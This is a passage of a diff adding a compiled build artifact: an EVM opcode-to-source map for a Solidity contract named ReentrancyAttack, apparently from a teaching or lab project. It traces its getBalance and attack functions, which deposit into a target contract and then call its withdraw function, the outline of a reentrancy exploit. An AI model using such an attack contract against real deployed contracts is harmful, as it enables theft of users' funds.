+      "path": "16"
+    },
+    "227": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "228": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "ISZERO",
+      "path": "16"
+    },
+    "229": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "PUSH2",
+      "path": "16",
+      "value": "0xED"
+    },
+    "232": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "JUMPI",
+      "path": "16"
+    },
+    "233": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x0"
+    },
+    "235": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "236": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "REVERT",
+      "path": "16"
+    },
+    "237": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "JUMPDEST",
+      "path": "16"
+    },
+    "238": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "POP",
+      "path": "16"
+    },
+    "239": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "PUSH2",
+      "path": "16",
+      "value": "0xF6"
+    },
+    "242": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "PUSH2",
+      "path": "16",
+      "value": "0x133"
+    },
+    "245": {
+      "fn": "ReentrancyAttack.getBalance",
+      "jump": "i",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "JUMP",
+      "path": "16"
+    },
+    "246": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "JUMPDEST",
+      "path": "16"
+    },
+    "247": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x40"
+    },
+    "249": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "250": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "MLOAD",
+      "path": "16"
+    },
+    "251": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "253": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "255": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "257": {
+      "op": "SHL"
+    },
+    "258": {
+      "op": "SUB"
+    },
+    "259": {
+      "offset": [
+        117,
+        153
+      ],
+      "op": "SWAP1",
+      "path": "16"
+    },
+    "260": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "SWAP3",
+      "path": "16"
+    },
+    "261": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "AND",
+      "path": "16"
+    },
+    "262": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "DUP3",
+      "path": "16"
+    },
+    "263": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "MSTORE",
+      "path": "16"
+    },
+    "264": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "MLOAD",
+      "path": "16"
+    },
+    "265": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "SWAP1",
+      "path": "16"
+    },
+    "266": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "DUP2",
+      "path": "16"
+    },
+    "267": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "SWAP1",
+      "path": "16"
+    },
+    "268": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "SUB",
+      "path": "16"
+    },
+    "269": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x20"
+    },
+    "271": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "ADD",
+      "path": "16"
+    },
+    "272": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "SWAP1",
+      "path": "16"
+    },
+    "273": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "RETURN",
+      "path": "16"
+    },
+    "274": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        553,
+        748
+      ],
+      "op": "JUMPDEST",
+      "path": "16"
+    },
+    "275": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        553,
+        748
+      ],
+      "op": "PUSH2",
+      "path": "16",
+      "value": "0xB8"
+    },
+    "278": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        553,
+        748
+      ],
+      "op": "PUSH2",
+      "path": "16",
+      "value": "0x142"
+    },
+    "281": {
+      "fn": "ReentrancyAttack.attack",
+      "jump": "i",
+      "offset": [
+        553,
+        748
+      ],
+      "op": "JUMP",
+      "path": "16"
+    },
+    "282": {
+      "offset": [
+        159,
+        191
+      ],
+      "op": "JUMPDEST",
+      "path": "16"
+    },
+    "283": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        159,
+        191
+      ],
+      "op": "CALLVALUE",
+      "path": "16"
+    },
+    "284": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        159,
+        191
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "285": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        159,
+        191
+      ],
+      "op": "ISZERO",
+      "path": "16"
+    },
+    "286": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        159,
+        191
+      ],
+      "op": "PUSH2",
+      "path": "16",
+      "value": "0x126"
+    },
+    "289": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        159,
+        191
+      ],
+      "op": "JUMPI",
+      "path": "16"
+    },
+    "290": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        159,
+        191
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x0"
+    },
+    "292": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        159,
+        191
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "293": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        159,
+        191
+      ],
+      "op": "REVERT",
+      "path": "16"
+    },
+    "294": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        159,
+        191
+      ],
+      "op": "JUMPDEST",
+      "path": "16"
+    },
+    "295": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        159,
+        191
+      ],
+      "op": "POP",
+      "path": "16"
+    },
+    "296": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        159,
+        191
+      ],
+      "op": "PUSH2",
+      "path": "16",
+      "value": "0xCF"
+    },
+    "299": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        159,
+        191
+      ],
+      "op": "PUSH2",
+      "path": "16",
+      "value": "0x21D"
+    },
+    "302": {
+      "fn": "ReentrancyAttack.attack",
+      "jump": "i",
+      "offset": [
+        159,
+        191
+      ],
+      "op": "JUMP",
+      "path": "16"
+    },
+    "303": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "JUMPDEST",
+      "path": "16"
+    },
+    "304": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        820,
+        841
+      ],
+      "op": "SELFBALANCE",
+      "path": "16",
+      "statement": 1
+    },
+    "305": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "SWAP1",
+      "path": "16"
+    },
+    "306": {
+      "fn": "ReentrancyAttack.getBalance",
+      "jump": "o",
+      "offset": [
+        754,
+        848
+      ],
+      "op": "JUMP",
+      "path": "16"
+    },
+    "307": {
+      "offset": [
+        117,
+        153
+      ],
+      "op": "JUMPDEST",
+      "path": "16"
+    },
+    "308": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x0"
+    },
+    "310": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "SLOAD",
+      "path": "16"
+    },
+    "311": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "313": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "315": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "317": {
+      "op": "SHL"
+    },
+    "318": {
+      "op": "SUB"
+    },
+    "319": {
+      "offset": [
+        117,
+        153
+      ],
+      "op": "AND",
+      "path": "16"
+    },
+    "320": {
+      "fn": "ReentrancyAttack.getBalance",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "DUP2",
+      "path": "16"
+    },
+    "321": {
+      "fn": "ReentrancyAttack.getBalance",
+      "jump": "o",
+      "offset": [
+        117,
+        153
+      ],
+      "op": "JUMP",
+      "path": "16"
+    },
+    "322": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        553,
+        748
+      ],
+      "op": "JUMPDEST",
+      "path": "16"
+    },
+    "323": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        619,
+        630
+      ],
+      "op": "PUSH7",
+      "path": "16",
+      "statement": 2,
+      "value": "0x38D7EA4C68000"
+    },
+    "331": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        606,
+        615
+      ],
+      "op": "CALLVALUE",
+      "path": "16"
+    },
+    "332": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        606,
+        630
+      ],
+      "op": "LT",
+      "path": "16"
+    },
+    "333": {
+      "branch": 6,
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        606,
+        630
+      ],
+      "op": "ISZERO",
+      "path": "16"
+    },
+    "334": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        598,
+        631
+      ],
+      "op": "PUSH2",
+      "path": "16",
+      "value": "0x156"
+    },
+    "337": {
+      "branch": 6,
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        598,
+        631
+      ],
+      "op": "JUMPI",
+      "path": "16"
+    },
+    "338": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        598,
+        631
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x0"
+    },
+    "340": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        598,
+        631
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "341": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        598,
+        631
+      ],
+      "op": "REVERT",
+      "path": "16"
+    },
+    "342": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        598,
+        631
+      ],
+      "op": "JUMPDEST",
+      "path": "16"
+    },
+    "343": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        659
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "statement": 3,
+      "value": "0x0"
+    },
+    "345": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        659
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "346": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        659
+      ],
+      "op": "SLOAD",
+      "path": "16"
+    },
+    "347": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        659
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x1"
+    },
+    "349": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        674,
+        680
+      ],
+      "op": "SLOAD",
+      "path": "16"
+    },
+    "350": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x40"
+    },
+    "352": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "353": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "MLOAD",
+      "path": "16"
+    },
+    "354": {
+      "op": "PUSH3",
+      "value": "0x362A95"
+    },
+    "358": {
+      "op": "PUSH1",
+      "value": "0xE0"
+    },
+    "360": {
+      "op": "SHL"
+    },
+    "361": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "DUP2",
+      "path": "16"
+    },
+    "362": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "MSTORE",
+      "path": "16"
+    },
+    "363": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        690,
+        694
+      ],
+      "op": "ADDRESS",
+      "path": "16"
+    },
+    "364": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x4"
+    },
+    "366": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "DUP3",
+      "path": "16"
+    },
+    "367": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "ADD",
+      "path": "16"
+    },
+    "368": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "MSTORE",
+      "path": "16"
+    },
+    "369": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "SWAP1",
+      "path": "16"
+    },
+    "370": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "MLOAD",
+      "path": "16"
+    },
+    "371": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "373": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "375": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "377": {
+      "op": "SHL"
+    },
+    "378": {
+      "op": "SUB"
+    },
+    "379": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        659
+      ],
+      "op": "SWAP1",
+      "path": "16"
+    },
+    "380": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        659
+      ],
+      "op": "SWAP4",
+      "path": "16"
+    },
+    "381": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        659
+      ],
+      "op": "AND",
+      "path": "16"
+    },
+    "382": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        659
+      ],
+      "op": "SWAP4",
+      "path": "16"
+    },
+    "383": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        666
+      ],
+      "op": "PUSH3",
+      "path": "16",
+      "value": "0x362A95"
+    },
+    "387": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        666
+      ],
+      "op": "SWAP4",
+      "path": "16"
+    },
+    "388": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x24"
+    },
+    "390": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "391": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "DUP5",
+      "path": "16"
+    },
+    "392": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "ADD",
+      "path": "16"
+    },
+    "393": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "SWAP4",
+      "path": "16"
+    },
+    "394": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "DUP3",
+      "path": "16"
+    },
+    "395": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "SWAP1",
+      "path": "16"
+    },
+    "396": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "SUB",
+      "path": "16"
+    },
+    "397": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "ADD",
+      "path": "16"
+    },
+    "398": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "DUP2",
+      "path": "16"
+    },
+    "399": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        674,
+        680
+      ],
+      "op": "DUP6",
+      "path": "16"
+    },
+    "400": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        659
+      ],
+      "op": "DUP9",
+      "path": "16"
+    },
+    "401": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "402": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "EXTCODESIZE",
+      "path": "16"
+    },
+    "403": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "ISZERO",
+      "path": "16"
+    },
+    "404": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "405": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "ISZERO",
+      "path": "16"
+    },
+    "406": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "PUSH2",
+      "path": "16",
+      "value": "0x19E"
+    },
+    "409": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "JUMPI",
+      "path": "16"
+    },
+    "410": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x0"
+    },
+    "412": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "413": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "REVERT",
+      "path": "16"
+    },
+    "414": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "JUMPDEST",
+      "path": "16"
+    },
+    "415": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "POP",
+      "path": "16"
+    },
+    "416": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "GAS",
+      "path": "16"
+    },
+    "417": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "CALL",
+      "path": "16"
+    },
+    "418": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "ISZERO",
+      "path": "16"
+    },
+    "419": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "420": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "ISZERO",
+      "path": "16"
+    },
+    "421": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "PUSH2",
+      "path": "16",
+      "value": "0x1B2"
+    },
+    "424": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "JUMPI",
+      "path": "16"
+    },
+    "425": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "RETURNDATASIZE",
+      "path": "16"
+    },
+    "426": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x0"
+    },
+    "428": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "429": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "RETURNDATACOPY",
+      "path": "16"
+    },
+    "430": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "RETURNDATASIZE",
+      "path": "16"
+    },
+    "431": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x0"
+    },
+    "433": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "REVERT",
+      "path": "16"
+    },
+    "434": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        641,
+        696
+      ],
+      "op": "JUMPDEST",
+      "path": "16"
+    },
+    "435": {
+      "op": "POP"
+    },
+    "436": {
+      "op": "POP"
+    },
+    "437": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        724
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "statement": 4,
+      "value": "0x0"
+    },
+    "439": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        724
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "440": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        724
+      ],
+      "op": "SLOAD",
+      "path": "16"
+    },
+    "441": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        724
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x1"
+    },
+    "443": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        734,
+        740
+      ],
+      "op": "SLOAD",
+      "path": "16"
+    },
+    "444": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x40"
+    },
+    "446": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "447": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "MLOAD",
+      "path": "16"
+    },
+    "448": {
+      "op": "PUSH4",
+      "value": "0x2E1A7D4D"
+    },
+    "453": {
+      "op": "PUSH1",
+      "value": "0xE0"
+    },
+    "455": {
+      "op": "SHL"
+    },
+    "456": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "DUP2",
+      "path": "16"
+    },
+    "457": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "MSTORE",
+      "path": "16"
+    },
+    "458": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x4"
+    },
+    "460": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "DUP2",
+      "path": "16"
+    },
+    "461": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "ADD",
+      "path": "16"
+    },
+    "462": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "SWAP3",
+      "path": "16"
+    },
+    "463": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "SWAP1",
+      "path": "16"
+    },
+    "464": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "SWAP3",
+      "path": "16"
+    },
+    "465": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "MSTORE",
+      "path": "16"
+    },
+    "466": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "MLOAD",
+      "path": "16"
+    },
+    "467": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "469": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "471": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "473": {
+      "op": "SHL"
+    },
+    "474": {
+      "op": "SUB"
+    },
+    "475": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        724
+      ],
+      "op": "SWAP1",
+      "path": "16"
+    },
+    "476": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        724
+      ],
+      "op": "SWAP3",
+      "path": "16"
+    },
+    "477": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        724
+      ],
+      "op": "AND",
+      "path": "16"
+    },
+    "478": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        724
+      ],
+      "op": "SWAP6",
+      "path": "16"
+    },
+    "479": {
+      "op": "POP"
+    },
+    "480": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        733
+      ],
+      "op": "PUSH4",
+      "path": "16",
+      "value": "0x2E1A7D4D"
+    },
+    "485": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        733
+      ],
+      "op": "SWAP5",
+      "path": "16"
+    },
+    "486": {
+      "op": "POP"
+    },
+    "487": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x24"
+    },
+    "489": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "490": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "DUP3",
+      "path": "16"
+    },
+    "491": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "ADD",
+      "path": "16"
+    },
+    "492": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "SWAP5",
+      "path": "16"
+    },
+    "493": {
+      "op": "POP"
+    },
+    "494": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "SWAP1",
+      "path": "16"
+    },
+    "495": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "DUP3",
+      "path": "16"
+    },
+    "496": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "SWAP1",
+      "path": "16"
+    },
+    "497": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "SUB",
+      "path": "16"
+    },
+    "498": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "ADD",
+      "path": "16"
+    },
+    "499": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "DUP2",
+      "path": "16"
+    },
+    "500": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        724
+      ],
+      "op": "DUP4",
+      "path": "16"
+    },
+    "501": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        724
+      ],
+      "op": "DUP8",
+      "path": "16"
+    },
+    "502": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "503": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "EXTCODESIZE",
+      "path": "16"
+    },
+    "504": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "ISZERO",
+      "path": "16"
+    },
+    "505": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "506": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "ISZERO",
+      "path": "16"
+    },
+    "507": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "PUSH2",
+      "path": "16",
+      "value": "0x203"
+    },
+    "510": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "JUMPI",
+      "path": "16"
+    },
+    "511": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "PUSH1",
+      "path": "16",
+      "value": "0x0"
+    },
+    "513": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "DUP1",
+      "path": "16"
+    },
+    "514": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "REVERT",
+      "path": "16"
+    },
+    "515": {
+      "fn": "ReentrancyAttack.attack",
+      "offset": [
+        706,
+        741
+      ],
+      "op": "JUMPDEST",
+      "path": "16"
+    },
+    "516": {
